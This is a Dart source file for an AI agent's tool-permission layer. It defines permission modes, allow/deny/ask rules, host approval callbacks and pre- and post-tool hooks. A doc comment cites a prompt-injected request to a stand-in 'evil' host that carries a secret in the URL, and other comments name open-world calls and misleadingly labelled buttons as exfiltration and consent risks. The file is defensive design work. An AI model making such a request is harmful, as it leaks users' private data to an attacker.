import '../tools/tool.dart';

/// How tool calls are approved when no rule matches.
enum PermissionMode {
  /// Read-only calls run; destructive calls ask; other writes run;
  /// open-world calls ask once the run has read private data.
  standard,

  /// Every call that is not a local read asks (open-world reads too).
  strict,

  /// Everything runs without asking (deny rules still apply).
  bypass,
}

/// What a rule or policy decides for a call.
enum PermissionBehavior { allow, deny, ask }

/// A tool call awaiting a permission decision.
final class ToolCallRequest {
  final String toolUseId;
  final String toolName;
  final Map<String, Object?> input;
  final ToolAnnotations annotations;
  final String displayLabel;

  /// Whether this run already read local/private data (notes, files, user
  /// answers). Open-world calls after that could exfiltrate it — e.g. a
  /// prompt-injected `GET https://evil/?d=<secret>` — so the standard mode
  /// asks for them.
  final bool afterPrivateRead;

  /// The call was triggered by the host (e.g. a UI button the model
  /// authored), not chosen by the model in this run. Such calls are asked
  /// about whenever they write or reach outside the app — even in bypass
  /// mode or under allow rules — because a misleading button label must
  /// never be the only consent.
  final bool hostInitiated;

  const ToolCallRequest({
    required this.toolUseId,
    required this.toolName,
    required this.input,
    required this.annotations,
    required this.displayLabel,
    this.afterPrivateRead = false,
    this.hostInitiated = false,
  });
}

/// Matches calls by tool name (glob: `*` wildcard) and optionally input.
final class PermissionRule {
  final String toolPattern;
  final PermissionBehavior behavior;

  /// Extra predicate on the input; the rule applies only when it returns
  /// true.
  final bool Function(Map<String, Object?> input)? when;

  /// Message returned to the model for a deny.
  final String? reason;

  const PermissionRule(
    this.toolPattern,
    this.behavior, {
    this.when,
    this.reason,
  });

  bool matches(ToolCallRequest call) {
    if (!_glob(toolPattern, call.toolName)) return false;
    return when?.call(call.input) ?? true;
  }

  static bool _glob(String pattern, String value) {
    if (pattern == '*') return true;
    final regex = RegExp(
      '^${pattern.split('*').map(RegExp.escape).join('.*')}\$',
    );
    return regex.hasMatch(value);
  }
}

/// The host's answer to an "ask".
sealed class PermissionDecision {
  const PermissionDecision();
}

final class Allow extends PermissionDecision {
  /// Replacement input (e.g. the user edited the arguments).
  final Map<String, Object?>? updatedInput;
  const Allow({this.updatedInput});
}

final class Deny extends PermissionDecision {
  /// Explanation returned to the model as the tool result.
  final String message;
  const Deny([this.message = 'The user declined this action.']);
}

/// Host callback that decides "ask" calls (typically by showing a sheet).
/// It may await the user for as long as needed — the time is excluded from
/// the tool timeout and the wall-clock budget.
typedef CanUseTool = Future<PermissionDecision> Function(ToolCallRequest call);

/// Permission configuration for a run.
///
/// Resolution order: deny rules → allow rules → ask rules → [mode] and
/// annotations → [canUseTool] for "ask". With no [canUseTool], "ask"
/// becomes a deny (fail closed).
final class PermissionPolicy {
  final PermissionMode mode;
  final List<PermissionRule> rules;
  final CanUseTool? canUseTool;

  const PermissionPolicy({
    this.mode = PermissionMode.standard,
    this.rules = const [],
    this.canUseTool,
  });

  /// Allows everything — for tests and fully trusted tool sets.
  static const allowAll = PermissionPolicy(mode: PermissionMode.bypass);

  /// The static part of the decision (before asking the host).
  ({PermissionBehavior behavior, String? reason}) evaluate(
    ToolCallRequest call,
  ) {
    for (final rule in rules) {
      if (rule.behavior == PermissionBehavior.deny && rule.matches(call)) {
        return (behavior: PermissionBehavior.deny, reason: rule.reason);
      }
    }
    final hostAnnotations = call.annotations;
    if (call.hostInitiated &&
        (!hostAnnotations.readOnly || hostAnnotations.openWorld)) {
      return (behavior: PermissionBehavior.ask, reason: null);
    }
    for (final behavior in const [
      PermissionBehavior.allow,
      PermissionBehavior.ask,
    ]) {
      for (final rule in rules) {
        if (rule.behavior == behavior && rule.matches(call)) {
          return (behavior: behavior, reason: rule.reason);
        }
      }
    }
    final a = call.annotations;
    final behavior = switch (mode) {
      PermissionMode.bypass => PermissionBehavior.allow,
      // Open-world calls are an exfiltration channel: strict always asks,
      // standard asks once private data has entered the run.
      _
          when a.openWorld &&
              (mode == PermissionMode.strict || call.afterPrivateRead) =>
        PermissionBehavior.ask,
      _ when a.readOnly => PermissionBehavior.allow,
      PermissionMode.strict => PermissionBehavior.ask,
      PermissionMode.standard =>
        a.destructive ? PermissionBehavior.ask : PermissionBehavior.allow,
    };
    return (behavior: behavior, reason: null);
  }
}

/// Result of a [PreToolUse] hook.
sealed class PreToolUseResult {
  const PreToolUseResult();
}

/// Continue (optionally with rewritten input).
final class ContinueCall extends PreToolUseResult {
  final Map<String, Object?>? updatedInput;
  const ContinueCall({this.updatedInput});
}

/// Block the call; [message] goes back to the model.
final class BlockCall extends PreToolUseResult {
  final String message;
  const BlockCall(this.message);
}

typedef PreToolUse = Future<PreToolUseResult> Function(ToolCallRequest call);

/// May replace the output (e.g. redact secrets) before the model sees it.
typedef PostToolUse =
    Future<ToolOutput> Function(ToolCallRequest call, ToolOutput output);

/// Lifecycle hooks. All are optional and awaited.
final class Hooks {
  /// Runs before permissions; can block or rewrite a call.
  final PreToolUse? preToolUse;
  final PostToolUse? postToolUse;

  const Hooks({this.preToolUse, this.postToolUse});
}
